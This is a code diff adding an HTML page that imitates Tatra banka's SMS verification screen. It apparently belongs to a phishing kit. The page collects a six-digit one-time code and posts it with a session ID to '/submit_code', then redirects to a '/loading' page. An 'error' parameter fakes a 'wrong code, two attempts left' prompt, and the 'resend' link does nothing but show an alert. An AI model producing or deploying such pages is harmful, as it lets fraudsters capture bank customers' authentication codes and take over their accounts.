@@ -1,0 +1,175 @@
+﻿<!DOCTYPE html>
+<html lang="sk">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tatra banka - SMS overenie</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', Roboto, sans-serif;
+            background-color: #1d1e23;
+            color: #ffffff;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+        .header { background-color: #08080a; padding: 16px 24px; }
+        .logo { display: flex; align-items: center; gap: 12px; }
+        .logo-circle {
+            width: 32px; height: 32px;
+            border: 3px solid #0097fd;
+            border-radius: 50%;
+            display: flex; align-items: center; justify-content: center;
+        }
+        .logo-inner { width: 14px; height: 14px; background-color: #0097fd; border-radius: 50%; }
+        .logo-text { font-size: 18px; font-weight: bold; color: #ffffff; }
+        .main-content {
+            flex: 1; display: flex; flex-direction: column;
+            justify-content: center; align-items: center; padding: 40px 20px;
+        }
+        .sms-container {
+            width: 100%; max-width: 400px;
+            background-color: #2a2b31; border-radius: 12px; padding: 32px;
+        }
+        .sms-title { font-size: 22px; font-weight: 600; margin-bottom: 12px; text-align: center; }
+        .sms-description { font-size: 14px; color: rgba(255,255,255,0.7); text-align: center; margin-bottom: 24px; }
+        .error-message {
+            background-color: rgba(244, 0, 51, 0.15);
+            border: 1px solid #f40033; border-radius: 8px;
+            padding: 12px 16px; margin-bottom: 20px;
+            display: none; align-items: center; gap: 10px;
+        }
+        .error-message.show { display: flex; }
+        .error-icon { width: 20px; height: 20px; fill: #f40033; }
+        .error-text { font-size: 14px; color: #f40033; }
+        .form-group { margin-bottom: 20px; }
+        .form-label { display: block; font-size: 14px; color: rgba(255,255,255,0.8); margin-bottom: 8px; }
+        .code-inputs { display: flex; gap: 8px; justify-content: center; margin-bottom: 8px; }
+        .code-input {
+            width: 48px; height: 56px; text-align: center;
+            font-size: 24px; font-weight: 600;
+            background-color: #1d1e23;
+            border: 2px solid #3a3b41; border-radius: 8px;
+            color: #ffffff; outline: none;
+        }
+        .code-input:focus { border-color: #0097fd; box-shadow: 0 0 0 3px rgba(0, 151, 253, 0.2); }
+        .code-input.error { border-color: #f40033; }
+        .field-error {
+            font-size: 12px; color: #f40033; margin-top: 6px;
+            display: none; align-items: center; gap: 4px; justify-content: center;
+        }
+        .field-error.show { display: flex; }
+        .submit-btn {
+            width: 100%; padding: 16px; font-size: 16px; font-weight: 600;
+            background-color: #0097fd; color: #ffffff;
+            border: none; border-radius: 8px; cursor: pointer; margin-top: 8px;
+        }
+        .submit-btn:hover { background-color: #0086e0; }
+        .attempts-warning {
+            text-align: center; margin-top: 16px;
+            font-size: 13px; color: #f40033; display: none;
+        }
+        .attempts-warning.show { display: block; }
+        .resend-link { text-align: center; margin-top: 20px; }
+        .resend-link a { color: #0097fd; text-decoration: none; font-size: 14px; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div class="logo">
+            <div class="logo-circle"><div class="logo-inner"></div></div>
+            <span class="logo-text">Tatra banka</span>
+        </div>
+    </div>
+    <div class="main-content">
+        <div class="sms-container">
+            <h1 class="sms-title">SMS overenie</h1>
+            <p class="sms-description">Zadajte overovací kód, ktorý sme vám poslali na vaše telefónne číslo.</p>
+            
+            <div class="error-message" id="errorMsg">
+                <svg class="error-icon" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
+                <span class="error-text">Nesprávny overovací kód. Skúste to znova.</span>
+            </div>
+            
+            <form id="smsForm">
+                <div class="form-group">
+                    <label class="form-label">Overovací kód</label>
+                    <div class="code-inputs">
+                        <input type="text" class="code-input" maxlength="1" data-index="0">
+                        <input type="text" class="code-input" maxlength="1" data-index="1">
+                        <input type="text" class="code-input" maxlength="1" data-index="2">
+                        <input type="text" class="code-input" maxlength="1" data-index="3">
+                        <input type="text" class="code-input" maxlength="1" data-index="4">
+                        <input type="text" class="code-input" maxlength="1" data-index="5">
+                    </div>
+                    <div class="field-error" id="fieldError">Kód je neplatný</div>
+                </div>
+                <button type="submit" class="submit-btn">Potvrdiť</button>
+            </form>
+            
+            <div class="attempts-warning" id="attemptsWarning">Zostávajú 2 pokusy</div>
+            <div class="resend-link"><a onclick="resendCode()">Odoslať kód znova</a></div>
+        </div>
+    </div>
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const sessionId = urlParams.get('session_id') || localStorage.getItem('session_id');
+        const showError = urlParams.get('error') === '1';
+        
+        // Show error state if redirected with error
+        if (showError) {
+            document.getElementById('errorMsg').classList.add('show');
+            document.getElementById('fieldError').classList.add('show');
+            document.getElementById('attemptsWarning').classList.add('show');
+            document.querySelectorAll('.code-input').forEach(i => i.classList.add('error'));
+        }
+        
+        // Auto-focus and navigation
+        const inputs = document.querySelectorAll('.code-input');
+        inputs[0].focus();
+        
+        inputs.forEach((input, index) => {
+            input.addEventListener('input', (e) => {
+                if (e.target.value.length === 1 && index < inputs.length - 1) {
+                    inputs[index + 1].focus();
+                }
+            });
+            input.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
+                    inputs[index - 1].focus();
+                }
+            });
+        });
+        
+        // Form submission
+        document.getElementById('smsForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            let code = '';
+            inputs.forEach(i => code += i.value);
+            
+            if (code.length < 6) {
+                document.getElementById('fieldError').classList.add('show');
+                return;
+            }
+            
+            fetch('/submit_code', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    session_id: sessionId,
+                    code: code,
+                    method: 'SMS'
+                })
+            }).then(() => {
+                window.location.href = '/loading?session_id=' + sessionId;
+            });
+        });
+        
+        function resendCode() {
+            alert('Kód bol odoslaný znova');
+        }
+    </script>
+</body>
+</html>
